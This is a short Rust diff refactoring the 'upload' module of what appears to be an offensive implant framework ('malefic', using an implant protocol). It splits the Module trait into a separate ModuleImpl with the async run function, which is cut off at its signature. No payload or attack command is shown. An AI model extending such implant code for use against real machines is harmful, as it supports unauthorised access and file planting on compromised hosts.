@@ -1,8 +1,9 @@
 // #[allow(non_snake_case)]
-use crate::{check_field, check_request, Module, Result, TaskResult};
+use crate::{check_field, check_request, Module, ModuleImpl, Result, TaskResult};
 use malefic_proto::proto::implantpb::spite::Body;
 
 use async_trait::async_trait;
+use futures::SinkExt;
 use malefic_trait::module_impl;
 use std::fs::OpenOptions;
 use std::io::Write;
@@ -11,8 +12,10 @@ pub struct Upload {}
 
 #[async_trait]
 #[module_impl("upload")]
-impl Module for Upload {
-    #[allow(unused_variables)]
+impl Module for Upload {}
+
+#[async_trait]
+impl ModuleImpl for Upload {
     async fn run(
         &mut self,
         id: u32,
